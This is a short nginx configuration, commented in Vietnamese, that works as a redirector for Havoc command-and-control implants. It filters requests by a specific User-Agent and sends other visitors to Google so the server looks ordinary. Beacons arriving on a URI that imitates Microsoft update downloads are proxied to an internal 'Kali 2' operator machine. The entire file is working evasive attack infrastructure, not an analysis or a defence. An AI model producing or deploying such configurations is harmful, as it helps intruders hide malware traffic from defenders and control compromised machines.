map $http_user_agent $is_havoc {
    default 0;
    "~*Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0" 1; 
}

server {
    listen 80; # Cổng nhận beacon
    server_name net.mytotobanservice.info;

    location / {
        # Nếu không đúng User-Agent -> Chuyển hướng sang Google (giả vờ là khách thường)
        if ($is_havoc = 0) {
            return 301 https://www.google.com;
        }

        # Nếu đúng User-Agent và đúng URI bí mật -> Đẩy về Kali 2
        location ~* ^/msdownload/update/v3/static/ {
            proxy_pass http://192.168.209.128:8080; # IP của Kali 2
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    }
}
